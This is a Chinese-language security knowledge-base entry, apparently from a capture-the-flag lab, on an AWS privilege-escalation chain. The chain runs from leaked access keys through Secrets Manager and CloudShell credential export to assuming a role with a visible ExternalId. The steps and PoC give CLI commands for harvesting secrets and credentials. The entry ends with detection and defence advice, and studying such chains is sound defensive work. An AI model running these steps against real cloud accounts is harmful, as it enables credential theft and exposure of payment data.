---
id: cloud-cloud-iam-leaked-ak-secretsmanager-cloudshell-assume-role-external-id
title: 泄露 AWS AK → Secrets Manager 取外部供应商口令 → CloudShell 凭据 → 借 trust policy 中可见的 ExternalId 扮演高权角色
type: scenario
domain: cloud
path: cloud/cloud-iam
technique: aws-secretsmanager-cloudshell-assume-role-externalid
aliases:
- ExternalId 不是秘密
- 泄露 config.json AWS 密钥
- assume-role --external-id
- CloudShell export-credentials
- ext-cost-user
- Secrets Manager 取供应商凭据
tags:
- cloud
- aws
- iam
- sts
- assume-role
- external-id
- secrets-manager
- cloudshell
- privilege-escalation
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V660
  verified_at: '2026-11-13T06:49:08+08:00'
  notes: 已对照12456原文挑战8核对：config.json 泄漏 data-bot 长期AK、enumerate-iam 命中 secretsmanager.list_secrets()、仅 ext/cost-optimization 可 get-secret-value 得 ext-cost-user 口令、控制台登录后 CloudShell aws configure export-credentials、iam get-role 的 trust policy 明文 ExternalId 37911、sts assume-role --external-id 扮演 ExternalCostOpimizeAccess、Payment 策略读 billing secret 取 flag 全部一致；与 lambda env AK 卡为不同入口与后半链，append_scenario 合理。PoC 未复跑。
---

## 一句话结论

网站泄露的 `config.json` 里含长期 AK/SK（data-bot），用 enumerate-iam 发现可 `secretsmanager:ListSecrets`；列表里唯一有权读取的 secret 是外部供应商账号 `ext-cost-user` 的口令，登录 AWS 控制台后在 CloudShell 导出该用户的临时凭据，再通过 IAM 自查读到角色的 trust policy——其中 `sts:ExternalId` 条件值明文可见（ExternalId 本就不是秘密），于是用 `aws sts assume-role --external-id <值>` 扮演 `ExternalCostOpimizeAccess`，最终从 billing secret 中取出 flag。

## 原理

- 部署配置/前端 `config.json` 常硬编码长期 AK/SK；拿到后先 `sts get-caller-identity` 确认身份，再用 `enumerate-iam` 等工具探测实际可调用的 API，避免逐个盲试触发告警。
- Secrets Manager 的访问控制按 secret ARN 粒度授权：`ListSecrets` 可能列出多个 secret，但只有策略允许的那个能 `GetSecretValue`。本例读到 `ext/cost-optimization` 中外部供应商账号的用户名/口令。
- AWS 控制台登录需要账号 ID（可从 `get-caller-identity` 获得）+ 用户名 + 口令；登录后 CloudShell 自带该用户的角色凭据，`aws configure export-credentials` 可导出可直接使用的临时 AK/SK/SessionToken。
- 角色信任策略（AssumeRolePolicyDocument）中若使用 `Condition: StringEquals {sts:ExternalId: "<值>"}`，该值会随 `iam:GetRole` 返回给任何被允许读角色的主体。ExternalId 的设计目的是防“混淆代理”（让第三方无法诱导客户角色被错误扮演），不是密钥；攻击者只要拥有可 AssumeRole 的身份并读到该值，条件即被满足。
- 为什么成立：`iam:GetPolicyVersion`/`GetRole`/`ListAttachedRolePolicies` 的读权限 + `sts:AssumeRole` 的授权 + ExternalId 明文可见三者叠加；角色所挂 `Payment` 策略允许 `secretsmanager:GetSecretValue` 读取 billing secret，最终危害是支付卡信息与 flag 泄露。

## 触发条件

- 目标暴露的配置文件中含有效长期 AK/SK（或其派生凭据）。
- 该身份拥有 secretsmanager 读取权限（至少 ListSecrets，且某个 secret 允许 GetSecretValue）。
- 读到的 secret 含可登录 AWS 控制台的 IAM 用户口令（且未强制 MFA）。
- 该用户拥有读角色/策略的 IAM 权限，且目标角色的 trust policy 允许其 AssumeRole（条件为 ExternalId）。
- 角色附加了高价值权限（如读 billing/payment secret）。

## 利用步骤

1. 从 `config.json` 提取 `accessKeyID`/`secretAccessKey`，`aws configure` 后 `aws sts get-caller-identity` 确认账号与用户名。
2. 权限枚举：`python3 enumerate-iam.py --access-key <AK> --secret-key <SK>`，命中 `secretsmanager.list_secrets()`。
3. `aws secretsmanager list-secrets` 枚举 secret，逐个 `get-secret-value`，找到唯一可读的 `ext/cost-optimization`，得到 `ext-cost-user` 的用户名口令。
4. 用账号 ID + 用户名口令登录 AWS 控制台；在 CloudShell 执行 `aws configure export-credentials` 导出 `ext-cost-user` 的临时凭据（含 SessionToken）。
5. IAM 自查：`aws iam list-attached-user-policies --user-name ext-cost-user`、`get-policy-version`、`get-role --role-name ExternalCostOpimizeAccess`，从 trust policy 读出 `sts:ExternalId` 值。
6. 扮演角色：`aws sts assume-role --role-arn arn:aws:iam::<acct>:role/ExternalCostOpimizeAccess --role-session-name x --external-id <值>`，配置临时凭据。
7. 读取角色可访问的 billing/payment secret，取得最终数据（flag/支付卡信息）。

## PoC

```bash
aws sts get-caller-identity
python3 enumerate-iam.py --access-key <AK> --secret-key <SK>
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id <secret-arn>
# -> {"Username":"ext-cost-user","Password":"..."}

# 控制台登录后 CloudShell:
aws configure export-credentials
aws iam get-role --role-name ExternalCostOpimizeAccess   # trust policy 中可见 ExternalId
aws sts assume-role --role-arn arn:aws:iam::<acct>:role/ExternalCostOpimizeAccess \
  --role-session-name x --external-id <ExternalId值>
# 用返回的临时凭据：
aws secretsmanager get-secret-value --secret-id <billing-secret-arn>
```

## 变体与关联

- 变体：ExternalId 也可能出现在 IaC 模板、工单、聊天记录或角色名/标签中；拿到任意读角色权限后优先检查 trust policy 而非猜值。
- 变体：没有控制台登录条件时，直接用泄露 AK 尝试 `sts:AssumeRole`；若角色信任 Principal 就是该用户且 ExternalId 可见，同样成立。
- 关联：[[cloud-cloud-iam-lambda-env-ak-enumerate-secrets-manager]]（泄露 AK→enumerate-iam→Secrets Manager 的前半链）、[[cloud-cloud-iam-aws-backdoor-role-assume-role-persistence]]（AssumeRole 的持久化用法）、[[cloud-cloud-iam-aws-dangerous-permission-privesc]]（IAM 提权原语总览）。
- 边界：角色 trust policy 还要求 MFA、源 IP 或特定 session 标签，ExternalId 不可读，secret 受 KMS 额外策略限制，或用户未启用控制台密码时链路中断。

## 检测与防御

- 检测：CloudTrail 中异常的 `GetSecretValue`、`ListSecrets`、`GetRole`、`AssumeRole`（尤其是带 ExternalId 的跨身份扮演）调用；GuardDuty 的凭据异常使用告警；控制台登录来自新设备/新地域。
- 防御：禁止在代码/配置中硬编码 AK/SK，改用角色与临时凭据；Secrets Manager 最小权限、按 secret 粒度授权；IAM 用户强制 MFA；不要依赖 ExternalId 的保密性来防护已泄露凭据，配合 `aws:SourceIdentity`/MFA/源 IP 条件；对 AssumeRole 与敏感 secret 读取做告警。
